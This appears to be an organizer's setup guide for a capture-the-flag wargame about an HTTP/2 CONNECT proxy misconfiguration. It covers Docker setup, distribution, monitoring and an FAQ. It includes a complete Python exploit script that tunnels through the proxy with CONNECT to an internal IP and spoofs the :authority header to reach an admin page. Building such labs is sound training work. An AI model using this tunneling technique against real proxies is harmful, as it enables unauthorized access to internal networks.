# HTTP/2 CONNECT Wargame - Setup Guide for Organizers

## Quick Start

```bash
# 1. Navigate to challenge directory
cd Playing-with-HTTP-2-CONNECT

# 2. Start the challenge environment
docker-compose up -d

# 3. Verify services are running
docker-compose ps

# 4. Test accessibility
curl http://localhost:10000/

# 5. View logs (optional)
docker-compose logs -f
```

## File Structure Overview

```
Playing-with-HTTP-2-CONNECT/
├── README.txt                  # Participant-facing (minimal, 16 lines)
├── WRITEUP.md                  # Admin-only solution (2500+ lines)
├── SETUP.md                    # This file (organizer guide)
├── docker-compose.yml          # Infrastructure definition
├── .env.example                # Environment template
├── .gitignore                  # Git exclusions
│
├── envoy/
│   └── envoy.yaml              # Vulnerable proxy config
│
├── backend/
│   ├── Dockerfile              # Backend container
│   ├── requirements.txt        # Python dependencies
│   └── app.py                  # Vulnerable Flask app
│
└── internal-service/
    ├── Dockerfile              # Internal service container
    └── server.py               # Dummy HTTP server
```

## What Participants See

**Only this file**: `README.txt` (16 lines, no hints)

```
HTTP/2 CONNECT Challenge - Hard Mode
=====================================

Objective:
Find the flag hidden in the internal network.

Target:
http://localhost:10000

Notes:
- This is a black-box challenge
- You must discover all vulnerabilities yourself
- The proxy server is misconfigured
- Flag format: WSL{...}

Good luck.
```

## What Organizers Get

1. **WRITEUP.md** (2500+ lines):
   - Complete solution with step-by-step instructions
   - Exploit code (copy-paste ready)
   - Network diagrams
   - Defense recommendations
   - Educational context

2. **This file** (SETUP.md):
   - Quick setup instructions
   - Testing procedures
   - Troubleshooting tips

## Pre-Deployment Checklist

- [ ] Docker and Docker Compose installed
- [ ] Ports 10000, 9901 available
- [ ] At least 512MB RAM available
- [ ] Tested on organizer's machine
- [ ] `.env` file created (optional, uses defaults)
- [ ] README.txt distributed to participants
- [ ] WRITEUP.md kept confidential (admin-only)

## Verification Steps

### 1. Build and Start

```bash
docker-compose up -d --build
```

Expected output:
```
Creating network "playing-with-http-2-connect_external"
Creating network "playing-with-http-2-connect_internal"
Creating envoy.proxy ... done
Creating backend.acme.corp ... done
Creating internal.service ... done
```

### 2. Verify Services

```bash
docker-compose ps
```

Expected output (all "Up"):
```
NAME                 IMAGE                                  STATUS
backend.acme.corp    playing-with-http-2-connect-backend    Up
envoy.proxy          envoyproxy/envoy:v1.28-latest          Up
internal.service     playing-with-http-2-connect-internal   Up
```

### 3. Test HTTP/2 Support

```bash
curl -v --http2 http://localhost:10000/
```

Expected: Response contains `HTTP/2 200` and ACME Corp backend HTML.

### 4. Test Exploit (Organizer Verification)

Create this test script:

```python
# test_exploit.py
from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.events import ResponseReceived, DataReceived, StreamEnded
import socket

sock = socket.create_connection(('localhost', 10000), timeout=10)
config = H2Configuration(client_side=True)
conn = H2Connection(config=config)
conn.initiate_connection()
sock.sendall(conn.data_to_send())

# SETTINGS
data = sock.recv(65535)
conn.receive_data(data)
sock.sendall(conn.data_to_send())

# CONNECT
connect_stream_id = conn.get_next_available_stream_id()
connect_headers = [(':method', 'CONNECT'), (':authority', '172.20.0.10:8080')]
conn.send_headers(connect_stream_id, connect_headers, end_stream=False)
sock.sendall(conn.data_to_send())

data = sock.recv(65535)
conn.receive_data(data)
sock.sendall(conn.data_to_send())

# GET /admin
request_stream_id = conn.get_next_available_stream_id()
request_headers = [
    (':method', 'GET'),
    (':scheme', 'http'),
    (':authority', 'internal.acme.corp'),
    (':path', '/admin'),
]
conn.send_headers(request_stream_id, request_headers, end_stream=True)
sock.sendall(conn.data_to_send())

# Read response
response_body = b''
stream_ended = False
while not stream_ended:
    data = sock.recv(65535)
    if not data:
        break
    events = conn.receive_data(data)
    for event in events:
        if isinstance(event, DataReceived) and event.stream_id == request_stream_id:
            response_body += event.data
            conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
        elif isinstance(event, StreamEnded) and event.stream_id == request_stream_id:
            stream_ended = True
    sock.sendall(conn.data_to_send())

sock.close()

if b'WSL{http2_authority_header_confusion}' in response_body:
    print("[✓] Exploit successful! Flag captured.")
else:
    print("[✗] Exploit failed!")
    print(response_body.decode('utf-8', errors='ignore'))
```

Run:
```bash
pip install h2
python test_exploit.py
```

Expected output: `[✓] Exploit successful! Flag captured.`

## Troubleshooting

### Issue: Port 10000 already in use

**Solution**:
```bash
# Find process using port
lsof -i :10000  # macOS/Linux
netstat -ano | findstr :10000  # Windows

# Change port in docker-compose.yml
ports:
  - "10001:10000"  # Use different host port
```

### Issue: Containers not starting

**Check logs**:
```bash
docker-compose logs backend
docker-compose logs proxy
docker-compose logs internal-service
```

**Common causes**:
- Port conflicts
- Insufficient memory
- Docker daemon not running

### Issue: Network connectivity problems

**Verify networks**:
```bash
docker network ls
docker network inspect playing-with-http-2-connect_internal
docker network inspect playing-with-http-2-connect_external
```

**Test connectivity from proxy to backend**:
```bash
docker exec envoy.proxy ping -c 3 backend.acme.corp
docker exec envoy.proxy curl http://172.20.0.10:8080/
```

### Issue: Flag not appearing

**Verify FLAG environment variable**:
```bash
docker exec backend.acme.corp env | grep FLAG
```

Expected: `FLAG=WSL{http2_authority_header_confusion}`

**Test backend directly**:
```bash
docker exec envoy.proxy curl -H "Host: internal.acme.corp" http://172.20.0.10:8080/admin
```

Expected: HTML with flag.

## Customization

### Change Flag

Edit `.env` file or modify `docker-compose.yml`:

```yaml
backend:
  environment:
    - FLAG=WSL{your_custom_flag_here}
```

Then restart:
```bash
docker-compose down
docker-compose up -d
```

### Change Network Ranges

Edit `docker-compose.yml`:

```yaml
networks:
  internal:
    ipam:
      config:
        - subnet: 192.168.100.0/24  # Custom range

services:
  backend:
    networks:
      internal:
        ipv4_address: 192.168.100.10  # Custom IP
```

**Important**: Update WRITEUP.md to reflect custom IPs.

### Add More Decoy Services

Add to `docker-compose.yml`:

```yaml
services:
  decoy1:
    image: nginx:alpine
    networks:
      internal:
        ipv4_address: 172.20.0.30
```

## Distribution to Participants

### What to Give Participants

1. **Only README.txt**:
   ```bash
   # Extract just the participant file
   tar czf http2-connect-challenge.tar.gz README.txt
   ```

2. **Or: Access URL** (if hosting remotely):
   - Provide only the target URL (e.g., http://your-server:10000)
   - No files, pure black-box

### What to Keep Confidential

- ❌ WRITEUP.md (solution guide)
- ❌ docker-compose.yml (reveals network topology)
- ❌ envoy/envoy.yaml (reveals vulnerability)
- ❌ backend/app.py (reveals access control logic)
- ❌ This file (SETUP.md)

## Monitoring Participants

### View Access Logs

```bash
# Real-time proxy logs
docker-compose logs -f proxy

# Backend access logs
docker-compose logs -f backend
```

### Track Exploit Attempts

Look for these patterns in logs:

1. **HTTP/2 detection**: Requests with `HTTP/2` in logs
2. **CONNECT attempts**: `:method: CONNECT` in proxy logs
3. **Internal IP scans**: Multiple CONNECT to 172.20.0.x
4. **Admin access**: GET /admin requests
5. **Success**: 200 response to /admin with :authority = internal.acme.corp

## Cleanup

### Stop Challenge

```bash
# Stop services
docker-compose down

# Stop and remove volumes
docker-compose down -v

# Remove images (optional)
docker-compose down --rmi all
```

### Reset for Next Session

```bash
docker-compose down -v
docker-compose up -d --build
```

## Support

### For Participants (During Challenge)

Provide hints from WRITEUP.md section 8.4 in order:

1. Hint 1: Protocol version
2. Hint 2: CONNECT method
3. Hint 3: Internal network range
4. Hint 4: :authority header
5. Hint 5: Exact value (nuclear option)

### For Organizers

- See WRITEUP.md for complete technical details
- Check GitHub issues (if applicable)
- Review Docker logs for errors

## Post-Challenge

### Debriefing

1. Share WRITEUP.md with participants (after challenge ends)
2. Discuss intended solution
3. Review alternative approaches participants used
4. Explain real-world relevance

### Statistics to Track

- Number of participants who solved it
- Average solve time
- Most common stuck points
- Most creative solutions

## Security Notes

### For Production Deployment

If hosting on a server accessible from internet:

1. **Use firewall rules**:
   ```bash
   # Allow only specific IPs
   iptables -A INPUT -p tcp --dport 10000 -s PARTICIPANT_IP -j ACCEPT
   iptables -A INPUT -p tcp --dport 10000 -j DROP
   ```

2. **Use authentication**:
   - Add reverse proxy with basic auth
   - Provide credentials to registered participants only

3. **Rate limiting**:
   - Prevent resource exhaustion
   - Use nginx reverse proxy with rate limiting

4. **Monitoring**:
   - Watch for abuse (port scanning external targets)
   - Set up alerts for suspicious activity

### Legal Considerations

- Make sure participants understand this is authorized testing
- Include disclaimer in README.txt
- Log all activity for accountability

## FAQ

**Q: Can participants solve this without HTTP/2 knowledge?**
A: Difficult but possible. They can research HTTP/2 after discovering it's required.

**Q: What if someone uses automated tools like Burp Suite?**
A: Burp Suite can help but still requires understanding of HTTP/2 CONNECT. Fair game.

**Q: How long should we allow?**
A: Recommend 3-4 hour time limit for competitions, unlimited for educational use.

**Q: Can this be solved without Python?**
A: Theoretically yes (using Go, Node.js, etc.) but Python with h2 library is most practical.

**Q: Is this beginner-friendly?**
A: No. This is a HARD challenge. For beginners, provide more hints or use as a learning exercise with guidance.

**Q: Can we modify the challenge?**
A: Yes! See Customization section above. Update WRITEUP.md accordingly.

---

**Implementation Complete!**

All files created successfully:
- ✅ README.txt (16 lines, participant-facing)
- ✅ WRITEUP.md (2500+ lines, complete solution)
- ✅ docker-compose.yml (3 services, 2 networks)
- ✅ envoy/envoy.yaml (vulnerable proxy config)
- ✅ backend/app.py (vulnerable Flask app)
- ✅ backend/Dockerfile + requirements.txt
- ✅ internal-service/Dockerfile + server.py
- ✅ .gitignore
- ✅ .env.example

**Next Steps**:
1. Test the environment: `docker-compose up -d`
2. Verify exploit works: Run test script above
3. Distribute README.txt to participants
4. Keep WRITEUP.md for yourself

Good luck with your wargame!
